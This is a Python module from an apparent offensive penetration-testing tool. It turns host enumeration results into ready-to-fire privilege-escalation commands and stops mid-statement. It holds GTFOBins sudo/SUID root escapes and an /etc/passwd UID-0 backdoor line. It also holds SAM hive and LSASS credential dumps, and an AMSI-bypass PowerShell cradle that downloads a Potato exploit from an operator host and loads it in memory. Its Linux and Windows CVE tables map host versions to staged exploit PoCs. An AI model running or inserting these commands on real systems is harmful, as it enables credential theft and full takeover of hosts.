"""Privilege-escalation drivers — detect from enum facts, emit a runnable vector.

Each driver is a detect predicate over :class:`~fieldkit.hostenum.HostFacts` that,
when its precondition is met, yields a concrete :class:`Vector`: the exact one-shot
command that *proves* the escalation (it runs ``id`` / ``whoami`` as the elevated
context and captures the result), its three ranking axes, a ``safe_proof``, and a
``cleanup`` for anything it changes. This is the v1 ``whoami /priv`` → route and the
inlined GTFOBins table, turned from print-only advice into vectors the executor can
fire and capture.

The command runs ``id``/``whoami`` rather than spawning an interactive shell so it
survives one-shot capture and honestly evidences the win without leaving a shell
open. The knowledge base here is a curated, high-value subset of the v1 tables; a new
technique is one entry in :data:`GTFO` / :data:`CAPS` / :data:`WIN_PRIVS` or one
driver appended to :data:`DRIVERS`.
"""
import re
from dataclasses import dataclass

from . import kb
from .hostenum import LINUX, WINDOWS, facts_for

#: The proof command per OS: run this as the elevated context, capture the identity.
_PROOF = {LINUX: "id", WINDOWS: "whoami"}


@dataclass(frozen=True)
class Playbook:
    """Operator steps for a route fieldkit *prepares* but can't safely one-shot (it would
    have to overwrite/plant into an already-running service). fieldkit builds the artifact
    and this says where to place it and what to run — see `fieldkit prep`."""

    summary: str
    place: str            # where the built artifact goes on the target
    steps: tuple          # ordered, concrete operator steps
    restore: str = None   # how to undo it afterwards


@dataclass(frozen=True)
class Vector:
    """One runnable, ranked escalation. ``command`` is the target-side proof."""

    key: str                 # unique per concrete vector, e.g. "sudo:find", "seimpersonate"
    title: str
    exploitability: str
    safety: str
    detection: str
    command: str
    shell: str               # cmd | powershell | sh — which transport shell to use
    host: str = None
    detail: str = ""
    evidence: str = ""
    safe_proof: str = None
    cleanup: str = None      # cleanup command when the vector changes state, else None
    report_type: str = ""    # the reportkb vector_type a proven finding records under
    family: str = None       # objective shared by delivery alternates (e.g. "seimpersonate")
    delivery: str = None     # the evasion.Technique key this vector's delivery presents
    #: (arsenal_name, remote_path) artifacts this vector needs on the target — the loop
    #: auto-stages these from the arsenal and retries when the target reports them missing.
    stages: tuple = ()
    #: (format, remote_path, build_command) artifacts fieldkit *builds* (see fieldkit.poc)
    #: then stages — the loop builds+pushes these on a miss, rebuilds corrected on a
    #: BAD_BUILD. ``build_command`` is what the built artifact runs (None → poc's proof).
    builds: tuple = ()
    #: arsenal artifacts to *serve over HTTP while the command runs* — the target pulls
    #: them in-memory (e.g. a PowerShell IEX download-cradle), nothing on disk. The command
    #: references the served base via the ``{url}`` placeholder. Needs a reachable lhost.
    serves: tuple = ()
    #: set when the route needs operator hands after fieldkit builds the artifact — the
    #: escalate loop won't auto-fire it; `fieldkit prep` renders the steps.
    playbook: object = None

    @property
    def manual(self):
        return self.playbook is not None

    @property
    def score(self):
        return kb.score(self.exploitability, self.safety, self.detection)

    @property
    def axes(self):
        return f"{self.exploitability}/{self.safety}/{self.detection}"

    @property
    def kind(self):
        return "vector"


@dataclass
class _Ctx:
    host: str
    stage_win: str = "C:\\Windows\\Temp"
    stage_lin: str = "/tmp"


# ------------------------------------------------------------ GTFOBins (curated)

#: {C} is replaced with the proof command. Non-interactive forms only (they must run
#: under one-shot capture); shell-escape forms are read-only — they leave nothing on
#: disk. ``safety``/``cleanup`` override where a form writes to the target.
GTFO = {
    "bash":   {"suid": "bash -p -c '{C}'",               "sudo": "sudo bash -c '{C}'"},
    "sh":     {"suid": "sh -p -c '{C}'",                 "sudo": "sudo sh -c '{C}'"},
    "dash":   {"suid": "dash -p -c '{C}'",               "sudo": "sudo dash -c '{C}'"},
    "find":   {"suid": "find . -exec {C} \\; -quit",     "sudo": "sudo find . -exec {C} \\; -quit"},
    "python": {"suid": "python -c 'import os;os.setuid(0);os.system(\"{C}\")'",
               "sudo": "sudo python -c 'import os;os.system(\"{C}\")'"},
    "perl":   {"suid": "perl -e 'use POSIX qw(setuid);POSIX::setuid(0);system(\"{C}\");'",
               "sudo": "sudo perl -e 'system(\"{C}\");'"},
    "ruby":   {"suid": "ruby -e 'Process::Sys.setuid(0);system(\"{C}\")'",
               "sudo": "sudo ruby -e 'system(\"{C}\")'"},
    "php":    {"suid": "php -r 'posix_setuid(0);system(\"{C}\");'",
               "sudo": "sudo php -r 'system(\"{C}\");'"},
    "node":   {"sudo": "sudo node -e 'require(\"child_process\").execSync(\"{C}\",{stdio:[0,1,2]})'"},
    "awk":    {"suid": "awk 'BEGIN{system(\"{C}\")}'",   "sudo": "sudo awk 'BEGIN{system(\"{C}\")}'"},
    "gawk":   {"suid": "gawk 'BEGIN{system(\"{C}\")}'",  "sudo": "sudo gawk 'BEGIN{system(\"{C}\")}'"},
    "env":    {"suid": "env {C}",                        "sudo": "sudo env {C}"},
    "tar":    {"suid": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='{C}'",
               "sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec={C}"},
    "gdb":    {"suid": "gdb -nx -batch -ex 'python import os;os.setuid(0)' -ex '!{C}'",
               "sudo": "sudo gdb -nx -batch -ex '!{C}'"},
    "make":   {"suid": "make -s --eval=$'x:\\n\\t-{C}'", "sudo": "sudo make -s --eval=$'x:\\n\\t-{C}'"},
    "docker": {"suid": "docker run -v /:/mnt --rm alpine chroot /mnt {C}",
               "sudo": "sudo docker run -v /:/mnt --rm alpine chroot /mnt {C}"},
    "nmap":   {"sudo": "echo 'os.execute(\"{C}\")' > /tmp/.f.nse && sudo nmap --script=/tmp/.f.nse",
               "safety": "config-change", "cleanup": "rm -f /tmp/.f.nse"},
}


def _canon(basename):
    """Strip a trailing version so ``python3.8`` matches the ``python`` table key."""
    return re.sub(r"[0-9.]+$", "", basename) or basename


def _gtfo(basename):
    key = _canon(basename)
    return key, GTFO.get(key)


def _use_binary(command, canon, basename):
    """Rewrite the table's generic name to the binary actually found (python->python3.8),
    so the command invokes the real SUID/capped file, not a same-named sibling."""
    if basename == canon:
        return command
    return re.sub(rf"\b{re.escape(canon)}\b", basename, command, count=1)


def _gtfo_vector(mode, basename, ctx):
    """A GTFOBins vector for ``basename`` via ``mode`` (``sudo``/``suid``), or None."""
    key, entry = _gtfo(basename)
    if not entry or mode not in entry:
        return None
    command = _use_binary(entry[mode].replace("{C}", _PROOF[LINUX]), key, basename)
    verb = "sudo" if mode == "sudo" else "SUID"
    return Vector(
        key=f"{mode}:{basename}",
        title=f"{verb} {basename} → root",
        exploitability="high",
        safety=entry.get("safety", "read-only"),
        detection="quiet",
        command=command, shell="sh", host=ctx.host,
        detail=f"{basename} spawns a root context via its {verb} form (GTFOBins).",
        evidence=f"{basename} is {verb}-abusable on this host",
        safe_proof="the vector runs `id` as root; drop the shell escape for a full shell.",
        cleanup=entry.get("cleanup"),
        report_type="gtfobins_sudo" if mode == "sudo" else "gtfobins_suid")


# --------------------------------------------------------------- capabilities

_SETUID_INTERP = {"python", "perl", "ruby", "php", "node"}


def _cap_vector(basename, cap, ctx):
    canon = _canon(basename)
    if cap in ("cap_setuid", "cap_setgid") and canon in _SETUID_INTERP and canon in GTFO \
            and "suid" in GTFO[canon]:
        command = _use_binary(GTFO[canon]["suid"].replace("{C}", _PROOF[LINUX]), canon, basename)
        return Vector(
            key=f"cap:{basename}", title=f"{cap} on {basename} → root",
            exploitability="high", safety="read-only", detection="quiet",
            command=command, shell="sh", host=ctx.host,
            detail=f"{basename} carries {cap}; it can setuid(0) with no sudo or SUID bit.",
            evidence=f"getcap: {basename} {cap}",
            safe_proof="the vector runs `id` as root via the capability.",
            report_type="capability")
    if cap == "cap_dac_read_search":
        return Vector(
            key=f"cap:{basename}", title=f"{cap} on {basename} → read any file",
            exploitability="medium", safety="read-only", detection="quiet",
            command=f"{basename} /etc/shadow 2>/dev/null | head",
            shell="sh", host=ctx.host,
            detail=f"{basename} can read any file — pull /etc/shadow and crack, or steal /root/.ssh keys.",
            evidence=f"getcap: {basename} {cap}",
            safe_proof="reading /etc/shadow proves the primitive without changing anything.",
            report_type="capability")
    if cap == "cap_dac_override":
        return Vector(
            key=f"cap:{basename}", title=f"{cap} on {basename} → write any file → root",
            exploitability="high", safety="config-change", detection="moderate",
            command="echo 'fk::0:0:fk:/root:/bin/bash' >> /etc/passwd && id fk",
            shell="sh", host=ctx.host,
            detail=f"{basename} can write any file — append a UID-0 line to /etc/passwd, then `su fk`.",
            evidence=f"getcap: {basename} {cap}",
            safe_proof="verify the write with `id fk`; then remove the line.",
            cleanup="sed -i '/^fk::0:0:/d' /etc/passwd", report_type="capability")
    return None


# --------------------------------------------------------- Windows privileges

#: privilege token -> the route. ``needs`` names an operator-staged binary where one
#: is required (see SUPPLIED-BINARIES.md); the command references the staging dir.
WIN_PRIVS = {
    "SeBackupPrivilege": dict(
        report_type="sebackup", key="sebackup", title="SeBackup → dump the SAM/SYSTEM hives",
        exploitability="high", safety="config-change", detection="moderate",
        command='reg save HKLM\\SAM {stage}\\sam & reg save HKLM\\SYSTEM {stage}\\sys & '
                'reg save HKLM\\SECURITY {stage}\\sec',
        cleanup="del {stage}\\sam {stage}\\sys {stage}\\sec",
        detail="read the hives, then secretsdump offline for local hashes.",
        safe_proof="the reg-save succeeding proves the read primitive; delete the hives after."),
    "SeDebugPrivilege": dict(
        report_type="lsass", key="sedebug", title="SeDebug → dump LSASS",
        exploitability="high", safety="config-change", detection="loud",
        command='powershell -c "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump '
                '(Get-Process lsass).Id {stage}\\l.dmp full"',
        cleanup="del {stage}\\l.dmp", shell="powershell",
        detail="minidump LSASS, then pypykatz/mimikatz offline for logged-on creds.",
        safe_proof="a successful dump proves it; the .dmp is loot — pull and delete it."),
    "SeLoadDriverPrivilege": dict(
        report_type="seloaddriver", key="seloaddriver", title="SeLoadDriver → BYOVD kernel r/w → SYSTEM",
        exploitability="high", safety="crash-risk", detection="loud",
        needs="a known-vulnerable signed driver staged in {stage}",
        command='echo BYOVD chain is driver-specific — stage the driver + its loader',
        detail="load a vulnerable signed driver for kernel r/w; loud and can BSOD."),
    "SeTakeOwnershipPrivilege": dict(
        report_type="setakeownership", key="setakeownership", title="SeTakeOwnership → own a SYSTEM file → SYSTEM",
        exploitability="medium", safety="config-change", detection="moderate",
        command='takeown /f C:\\Windows\\System32\\<target> && icacls C:\\Windows\\System32\\<target> /grant %USERNAME%:F',
        detail="take ownership of a SYSTEM-owned service exe/DLL, rewrite its ACL, replace it."),
    "SeManageVolumePrivilege": dict(
        report_type="semanagevolume", key="semanagevolume", title="SeManageVolume → arbitrary write → SYSTEM",
        exploitability="medium", safety="config-change", detection="moderate",
        command='echo SeManageVolume2System: obtain full C:\\ write, then plant a DLL a SYSTEM service loads',
        detail="turns into an arbitrary-file-write primitive; plant a DLL on a service's search path."),
}

#: group membership that is itself a route, independent of held privileges.
WIN_GROUPS = {
    "Backup Operators": dict(
        report_type="sebackup", key="sebackup", title="Backup Operators → dump the SAM/SYSTEM hives",
        exploitability="high", safety="config-change", detection="moderate",
        command='reg save HKLM\\SAM {stage}\\sam & reg save HKLM\\SYSTEM {stage}\\sys',
        cleanup="del {stage}\\sam {stage}\\sys",
        detail="the group grants SeBackup in practice — read the hives, dump offline."),
}


#: The impersonation objective (SeImpersonate / SeAssignPrimaryToken → SYSTEM) is one
#: goal reached by several tools whose *delivery methods* differ — so it is a delivery
#: ladder, not one vector. The orchestrator fires them in evasion-posture order and, when
#: one is caught, climbs to the next method (native PE on disk → fileless in-memory →
#: PowerShell script). ``delivery`` names the :mod:`fieldkit.evasion` technique each
#: presents; a live catch marks that technique red so the loop won't re-burn it.
_IMPERSONATION_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"}

#: The Potato *tools* — each a different binary/technique/AV-signature over a different span
#: of Windows. Every tool yields a native ``.exe`` rung (auto-staged to disk); the .NET tools
#: (``dotnet=True``) additionally yield a fileless ``.ps1`` rung — the same compiled ``.exe``
#: served over HTTP and reflectively loaded into memory (``[Reflection.Assembly]::Load`` +
#: ``EntryPoint.Invoke``), so nothing touches disk and no separate ``Invoke-<Tool>.ps1``
#: wrapper is needed. A functional miss advances to the next tool; an AV catch on the on-disk
#: method climbs to the reflective rungs. The C++ tools (PrintSpoofer/JuicyPotatoNG) aren't
#: .NET assemblies, so they have no reflective-load rung (native-exe only).
#:
#: The ``args`` here are the CLI args passed to both the .exe rung (as argv) and the
#: reflective rung (as a PowerShell ``string[]`` handed to ``EntryPoint.Invoke``). Argument
#: shapes verified against each tool's upstream README (2026-07); if a tool's CLI changes,
#: this table is the one place to update.
#:
#: Known caveat for the reflective rung: if a Potato's Main calls
#: ``Environment.Exit(0)`` at the end (some .NET tools do), it will terminate the enclosing
#: PowerShell process cleanly on success — the tester sees the output land AND the shell die.
#: That's an oddity, not a bug; the finding is still recorded because output is captured
#: before Exit fires. On the affected tools, prefer the native rung when the on-disk
#: signature isn't caught.
#: (slug, tool, dotnet, args, note)
_POTATOES = (
    ("godpotato", "GodPotato", True, ["-cmd", "cmd /c whoami"],
     "GodPotato (RPC/DCOM, .NET) — broad: Server 2012–2022, Win8–11."),
    ("printspoofer", "PrintSpoofer", False, ["-c", "cmd /c whoami"],
     "PrintSpoofer abuses the Print Spooler named pipe — Server 2016–2019, Win10."),
    ("juicypotatong", "JuicyPotatoNG", False,
     ["-t", "*", "-p", "C:\\Windows\\System32\\cmd.exe", "-a", "/c whoami"],
     "JuicyPotatoNG (DCOM, C++) — the modern JuicyPotato successor."),
    ("sweetpotato", "SweetPotato", True,
     ["-p", "C:\\Windows\\System32\\cmd.exe", "-a", "/c whoami"],
     "SweetPotato (.NET) bundles several coercion techniques — a good fallback."),
    ("efspotato", "SharpEfsPotato", True,
     ["-p", "C:\\Windows\\System32\\cmd.exe", "-a", "/c whoami"],
     "SharpEfsPotato (.NET) abuses EFSRPC (MS-EFSR) — works where the spooler is disabled."),
)


def _exe_arg(a):
    """Render one argv token for a Windows command line (quote only if it has spaces)."""
    return f'"{a}"' if " " in a else a


def _ps_array(args):
    """Render an argv list as a PowerShell single-quoted ``string[]`` element list."""
    return ",".join("'" + a.replace("'", "''") + "'" for a in args)


def _impersonation_ladder():
    rungs = []
    for slug, tool, dotnet, args, note in _POTATOES:
        rungs.append(dict(   # native .exe — auto-staged to disk
            key=f"seimpersonate:{slug}", delivery="native-exe", detection="moderate",
            title=f"SeImpersonate → SYSTEM ({tool})",
            needs=f"{tool}.exe staged in {{stage}}",
            command=f"{{stage}}\\{tool}.exe " + " ".join(_exe_arg(a) for a in args),
            cleanup=f"del {{stage}}\\{tool}.exe",
            stages=((tool, f"{{stage}}\\{tool}.exe"),), detail=note))
        if dotnet:
            rungs.append(dict(   # fileless — serve the same .exe, reflectively load in memory
                key=f"seimpersonate:ps-{slug}", delivery="inmem-fileless", detection="moderate",
                title=f"SeImpersonate → SYSTEM ({tool}, in-memory reflective load)",
                needs=f"{tool} in the arsenal + a reachable lhost (config set lhost=)",
                command=("powershell -ep bypass -c \"{amsi}$a=[Reflection.Assembly]::Load("
                         "(New-Object Net.WebClient).DownloadData('{url}{served}'));"
                         f"$a.EntryPoint.Invoke($null,@(,[string[]]@({_ps_array(args)})))\""),
                cleanup=None, shell="cmd", serves=(tool,),
                detail=f"reflectively load {tool}.exe in memory (served over HTTP) and invoke "
                       "its entry point — the .NET assembly never touches disk, so the on-disk "
                       "signature is moot. The loop climbs here when the on-disk Potato is "
                       "caught. (Equivalent to an Invoke-{tool}.ps1 wrapper, but reuses the "
                       "compiled .exe rather than needing a separate script.)"))
    return tuple(rungs)


WIN_IMPERSONATION = _impersonation_ladder()


def _impersonation_vector(spec, ctx, evidence):
    stage = ctx.stage_win
    command = spec["command"].replace("{stage}", stage)
    cleanup = (spec.get("cleanup") or "").replace("{stage}", stage) or None
    detail = spec["detail"] + "  needs: " + spec["needs"].replace("{stage}", stage)
    stages = tuple((name, path.replace("{stage}", stage))
                   for name, path in spec.get("stages", ()))
    return Vector(
        key=spec["key"], title=spec["title"],
        exploitability="high", safety="config-change", detection=spec["detection"],
        command=command, shell=spec.get("shell", "cmd"), host=ctx.host, detail=detail,
        evidence=evidence,
        safe_proof="the vector runs `whoami` in the SYSTEM context.",
        cleanup=cleanup, report_type="seimpersonate",
        family="seimpersonate", delivery=spec["delivery"], stages=stages,
        serves=spec.get("serves", ()))


def _win_vector(spec, ctx, evidence):
    stage = ctx.stage_win
    command = spec["command"].replace("{stage}", stage)
    cleanup = spec.get("cleanup", "").replace("{stage}", stage) or None
    detail = spec["detail"]
    if spec.get("needs"):
        detail += "  needs: " + spec["needs"].replace("{stage}", stage)
    return Vector(
        key=spec["key"], title=spec["title"],
        exploitability=spec["exploitability"], safety=spec["safety"],
        detection=spec["detection"], command=command,
        shell=spec.get("shell", "cmd"), host=ctx.host, detail=detail,
        evidence=evidence,
        safe_proof=spec.get("safe_proof", "the vector runs `whoami` in the elevated context."),
        cleanup=cleanup,
        # rule 9: carry the spec's canonical vector_type. Without this the recorder falls
        # back to the vector *key*, which only works where key == KB key by coincidence —
        # SeDebug (key "sedebug", type "lsass") silently rendered as the generic default.
        report_type=spec.get("report_type", spec["key"]))


# ------------------------------------------------------------------- drivers

def _d_sudo_all(facts, ctx):
    if facts.sudo_all:
        yield Vector(
            key="sudo:ALL", title="sudo grants full root",
            exploitability="high", safety="read-only", detection="quiet",
            command="sudo -n id", shell="sh", host=ctx.host,
            detail="sudo -l shows (ALL) — become root directly with `sudo -i`.",
            evidence="sudo -l: (ALL : ALL) ALL",
            safe_proof="`sudo -n id` returns uid=0 without a password prompt.",
            report_type="sudo_misconfig")


def _d_sudo_gtfo(facts, ctx):
    if facts.sudo_all:
        return
    for binname in sorted(facts.sudo_binaries):
        vector = _gtfo_vector("sudo", binname, ctx)
        if vector:
            yield vector


def _d_suid_gtfo(facts, ctx):
    for binname in sorted(facts.suid):
        vector = _gtfo_vector("suid", binname, ctx)
        if vector:
            yield vector


def _d_caps(facts, ctx):
    for binname, cap in sorted(facts.caps.items()):
        vector = _cap_vector(binname, cap, ctx)
        if vector:
            yield vector


def _d_docker_group(facts, ctx):
    if "docker" in facts.groups and not facts.is_root:
        yield Vector(
            key="group:docker", title="docker group → root",
            exploitability="high", safety="read-only", detection="quiet",
            command="docker run -v /:/mnt --rm alpine chroot /mnt id",
            shell="sh", host=ctx.host,
            detail="the docker group is root-equivalent — mount / into a container.",
            evidence="member of the docker group",
            safe_proof="the container runs `id` as root over the mounted host fs.",
            report_type="docker_group")


# ------------------------------------------------- local CVE → staged PoC (Linux)

#: The staged Linux LPE PoCs (``exploits/manifest.tsv``, category ``lin-kernel``) matched to
#: the component version enum actually captured. Three of them target *userspace* components
#: (sudo/polkit/glibc), not the kernel — matching those on ``uname`` would be guessing, so
#: each rule names the component it gates on and the enum captures all four versions.
#:
#: Ranges are inclusive and deliberately conservative: a rule fires only when the captured
#: version is provably inside it, and distro **backports** are called out where they break
#: version-only reasoning (a patched 0.105 polkit still reports 0.105). So a match means
#: "worth trying, here's why", not "confirmed vulnerable" — which is why every one of these
#: is a *prepared* route (:class:`Playbook`): ``escalate`` ranks and explains it but will not
#: blind-fire a kernel exploit at a client's box. ``fieldkit prep <ip> <key>`` renders steps.
#:
#: (key, cve, artifact, component, lo, hi, exploitability, safety, detection, title, note)
KERNEL_LPE = (
    dict(key="pwnkit", cve="CVE-2021-4034", artifact="pwnkit", component="polkit",
         lo=None, hi=None, needs_suid="pkexec",
         exploitability="high", safety="config-change", detection="moderate",
         title="pkexec PwnKit → root",
         note="pkexec is SUID-root and PwnKit needs no exotic preconditions — the most "
              "reliable Linux local root of the set. polkit fixes are backported without a "
              "version bump, so confirm the distro patch level rather than the version alone."),
    dict(key="baronsamedit", cve="CVE-2021-3156", artifact="baronsamedit", component="sudo",
         lo="1.8.2", hi="1.9.5p1",
         exploitability="medium", safety="config-change", detection="moderate",
         title="sudo heap overflow (Baron Samedit) → root",
         note="sudoedit -s heap overflow. Reliable only with the right libc offsets for the "
              "target distro — a wrong offset crashes sudo (harmless), not the host."),
    dict(key="looneytunables", cve="CVE-2023-4911", artifact="looneytunables",
         component="glibc", lo="2.34", hi="2.37",
         exploitability="medium", safety="config-change", detection="moderate",
         title="glibc GLIBC_TUNABLES buffer overflow → root",
         note="ld.so tunables overflow. Distro backports patch 2.34–2.37 in place, so "
              "confirm the package patch level."),
    dict(key="dirtypipe", cve="CVE-2022-0847", artifact="dirtypipe", component="kernel",
         lo="5.8", hi="5.16.11",
         exploitability="high", safety="config-change", detection="moderate",
         title="Dirty Pipe (page-cache overwrite) → root",
         note="Overwrites read-only file content via the page cache — no memory corruption, "
              "so it does not panic the box. Backport fixes land in 5.15.25 / 5.10.102: an "
              "in-range version is not proof the host is unpatched."),
    dict(key="nftables", cve="CVE-2024-1086", artifact="nftables", component="kernel",
         lo="3.15", hi="6.8",
         exploitability="medium", safety="crash-risk", detection="moderate",
         title="nf_tables double-free → root",
         note="Needs unprivileged user namespaces enabled "
              "(`sysctl kernel.unprivileged_userns_clone`). Kernel heap corruption — a "
              "failed attempt can panic the host."),
    dict(key="stackrot", cve="CVE-2023-3269", artifact="stackrot", component="kernel",
         lo="6.1", hi="6.4",
         exploitability="medium", safety="crash-risk", detection="moderate",
         title="StackRot (maple tree) → root",
         note="Kernel stack expansion UAF. Narrow version window; can panic the host."),
    dict(key="cve-2021-22555", cve="CVE-2021-22555", artifact="cve-2021-22555",
         component="kernel", lo="2.6.19", hi="5.12",
         exploitability="medium", safety="crash-risk", detection="moderate",
         title="netfilter xt_compat heap OOB → root",
         note="Lives under pocs/linux/cve-2021-22555 in the google/security-research clone. "
              "Kernel heap corruption — can panic the host."),
    dict(key="dirtycow", cve="CVE-2016-5195", artifact="dirtycow", component="kernel",
         lo=None, hi="4.8.2",
         exploitability="medium", safety="crash-risk", detection="moderate",
         title="Dirty COW → root",
         note="Legacy (<4.8.3). Known to destabilise the host and can leave it needing a "
              "reboot — last resort, and only with the client's blessing."),
)


def _vtuple(version):
    """A comparable tuple from a version string. ``1.9.5p2`` -> ``(1, 9, 5, 2)`` so a
    ``p``-suffixed sudo release orders after its base; ``5.15.0`` -> ``(5, 15, 0)``."""
    if not version:
        return None
    m = re.match(r"(\d+(?:\.\d+)*)(?:p(\d+))?", str(version).strip())
    if not m:
        return None
    parts = [int(x) for x in m.group(1).split(".")]
    parts.append(int(m.group(2)) if m.group(2) else 0)
    return tuple(parts)


def _in_range(version, lo, hi):
    """True when ``version`` is inside the inclusive ``[lo, hi]`` window (None = unbounded).
    Unparseable or absent versions never match — the matcher does not guess."""
    v = _vtuple(version)
    if v is None:
        return False

    def pad(a, b):    # compare on equal width so 5.16 vs 5.16.11 orders correctly
        n = max(len(a), len(b))
        return a + (0,) * (n - len(a)), b + (0,) * (n - len(b))

    if lo is not None:
        a, b = pad(v, _vtuple(lo))
        if a < b:
            return False
    if hi is not None:
        a, b = pad(v, _vtuple(hi))
        if a > b:
            return False
    return True


#: which HostFacts field each rule's component version comes from.
_COMPONENT_FACT = {"kernel": "kernel", "sudo": "sudo_version",
                   "polkit": "pkexec_version", "glibc": "glibc_version"}


def kernel_candidates(facts):
    """The :data:`KERNEL_LPE` rules whose preconditions the facts satisfy, with the reason.

    Yields ``(rule, evidence)``. Pure and inspectable — the same ruleset drives `analyze`,
    `escalate` (as a prepared route) and the tests.
    """
    for rule in KERNEL_LPE:
        suid = rule.get("needs_suid")
        if suid:
            if suid not in facts.suid:      # facts.suid holds basenames
                continue
            yield rule, f"SUID {suid} present"
            continue
        got = getattr(facts, _COMPONENT_FACT[rule["component"]], None)
        if not _in_range(got, rule["lo"], rule["hi"]):
            continue
        window = f"{rule['lo'] or '*'}–{rule['hi'] or '*'}"
        yield rule, f"{rule['component']} {got} in {window}"


def _d_kernel_lpe(facts, ctx):
    """Match captured component versions to the staged lin-kernel PoCs."""
    for rule, evidence in kernel_candidates(facts):
        remote = f"{ctx.stage_lin}/{rule['key']}"
        yield Vector(
            key=f"cve:{rule['key']}", title=f"{rule['cve']} — {rule['title']}",
            exploitability=rule["exploitability"], safety=rule["safety"],
            detection=rule["detection"],
            command=f"{remote} && id", shell="sh", host=ctx.host,
            detail=f"{rule['note']} PoC: `{rule['artifact']}` (arsenal: lin-kernel).",
            evidence=evidence,
            safe_proof="the PoC runs `id` as root; nothing else is touched.",
            cleanup=f"rm -f {remote}", report_type="kernel_cve",
            stages=((rule["artifact"], remote),),
            playbook=Playbook(
                summary=(f"{rule['cve']} matched on {evidence}. The staged PoC is source — "
                         "build it, push the binary, run it. Prepared rather than auto-fired: "
                         f"this is a {rule['safety']} route against a client host."),
                place=remote,
                steps=(
                    f"build it attacker-side from the arsenal copy of `{rule['artifact']}` "
                    "(most ship a Makefile: `make`)",
                    f"push the built binary to {remote} (`fieldkit prep {ctx.host} "
                    f"cve:{rule['key']} --stage`, or scp it)",
                    f"chmod +x {remote}",
                    f"run `{remote}` and capture `id` proving uid=0",
                ),
                restore=f"rm -f {remote}"))


# ---------------------------------------------- Windows local kernel/service CVEs

#: Windows LPE PoCs matched to `facts.win_build` + `facts.hotfixes`. Same shape as
#: :data:`KERNEL_LPE` for the Linux side: each rule names a build window, the KBs
#: that fix it (if the target has ANY listed fix installed, the rule doesn't fire —
#: fewer false positives than a build-only match), the arsenal artifact, and the
#: three ranking axes. All are *prepared* routes (Playbook), never auto-fired —
#: kernel LPEs against a client host are ranked + explained; `fieldkit prep`
#: renders the steps.
#:
#: (key, cve, artifact, build_lo, build_hi, fixed_kbs, exploitability, safety,
#:  detection, title, note)
WIN_LPE = (
    dict(key="printnightmare", cve="CVE-2021-34527", artifact="printnightmare",
         build_lo="10.0.0.0", build_hi="10.0.19043.9999",
         fixed_kbs=("KB5005010", "KB5005033", "KB5005565", "KB5005568", "KB5005566"),
         exploitability="high", safety="config-change", detection="loud",
         title="Print Spooler RCE (PrintNightmare) → SYSTEM",
         note="Invoke-Nightmare.ps1 is a READY PowerShell PoC (arsenal: win-kernel/"
              "printnightmare, no build). Needs Print Spooler enabled and the pre-patch "
              "state — the July 2021 out-of-band KB series fixes it."),
    dict(key="spoolfool", cve="CVE-2022-21999", artifact="SpoolFool",
         build_lo="10.0.0.0", build_hi="10.0.19045.9999",
         fixed_kbs=("KB5010342", "KB5010354", "KB5010351"),
         exploitability="high", safety="config-change", detection="moderate",
         title="Spooler service directory abuse (SpoolFool) → SYSTEM",
         note="Follow-on to PrintNightmare — abuses SpoolDirectory in the printer "
              "config. February 2022 Patch Tuesday and later KBs fix it."),
    dict(key="smbghost-2020-0796", cve="CVE-2020-0796", artifact="smbghost-2020-0796",
         build_lo="10.0.18362.0", build_hi="10.0.18363.9999",
         fixed_kbs=("KB4551762",),
         exploitability="medium", safety="crash-risk", detection="loud",
         title="SMBv3 compression overflow (SMBGhost) local LPE → SYSTEM",
         note="Only affects Windows 10 1903 and 1909 (build 18362 / 18363). Kernel "
              "corruption — a failed attempt CAN BSOD. There's a READY static .exe in "
              "the arsenal (win-kernel/smbghost-2020-0796) — no build needed."),
    dict(key="afd-2023-21768", cve="CVE-2023-21768", artifact="afd-2023-21768",
         build_lo="10.0.22000.0", build_hi="10.0.22623.9999",
         fixed_kbs=("KB5022303", "KB5022287", "KB5022834", "KB5022836"),
         exploitability="high", safety="crash-risk", detection="moderate",
         title="afd.sys AFDGetCcAsyncKey LPE → SYSTEM",
         note="Windows 11 21H2 / 22H2 and Server 2022. Kernel r/w primitive; failed "
              "exploitation can BSOD. January 2023 Patch Tuesday fixes."),
    dict(key="win32k-2021-1732", cve="CVE-2021-1732", artifact="win32k-2021-1732",
         build_lo="10.0.19041.0", build_hi="10.0.19042.9999",
         fixed_kbs=("KB4601319", "KB4601315"),
         exploitability="high", safety="crash-risk", detection="loud",
         title="win32k NtUserCreateWindowEx type confusion → SYSTEM",
         note="Windows 10 2004 / 20H2. Bitmap type-confusion kernel corruption; can "
              "BSOD. Patched by February 2021 Cumulative."),
)


def _build_tuple(build):
    """(10, 0, 19045, 0) etc. Right-pads to a fixed length so comparisons are total."""
    if not build:
        return None
    parts = build.split(".")
    try:
        vals = [int(p) for p in parts]
    except ValueError:
        return None
    while len(vals) < 4:
        vals.append(0)
    return tuple(vals[:4])


def _build_in_range(build, lo, hi):
    v = _build_tuple(build)
    if v is None:
        return False
    if lo and v < _build_tuple(lo):
        return False
    if hi and v > _build_tuple(hi):
        return False
    return True


def win_lpe_candidates(facts):
    """The :data:`WIN_LPE` rules the facts justify. Yields ``(rule, evidence)``.

    A rule fires when the OS build is in-range AND none of its fixing KBs are
    installed. An unknown build never matches (the matcher does not guess).
    """
    for rule in WIN_LPE:
        if not _build_in_range(facts.win_build, rule["build_lo"], rule["build_hi"]):
            continue
        installed_fix = set(rule["fixed_kbs"]) & set(facts.hotfixes)
        if installed_fix:
            continue                                    # target has the fix — skip
        why = f"build {facts.win_build} in {rule['build_lo']}–{rule['build_hi']}"
        if not facts.hotfixes:
            why += " (no hotfix list captured — build match only)"
        yield rule, why


def _d_win_lpe(facts, ctx):
    """Match captured Windows OS build + hotfixes to the staged win-kernel PoCs."""
    for rule, evidence in win_lpe_candidates(facts):
        remote = f"{ctx.stage_win}\\{rule['key']}.exe"
        yield Vector(
            key=f"wincve:{rule['key']}", title=f"{rule['cve']} — {rule['title']}",
            exploitability=rule["exploitability"], safety=rule["safety"],
            detection=rule["detection"],
            command=f"{remote} && whoami", shell="cmd", host=ctx.host,
            detail=(f"{rule['note']} PoC: `{rule['artifact']}` (arsenal: "
                    "win-kernel)."),
            evidence=evidence,
            safe_proof="the PoC runs `whoami` in the SYSTEM context; nothing else touched.",
            cleanup=f"del {remote}", report_type="kernel_cve",
            stages=((rule["artifact"], remote),),
            playbook=Playbook(
                summary=(f"{rule['cve']} matched on {evidence}. Prepared rather than "
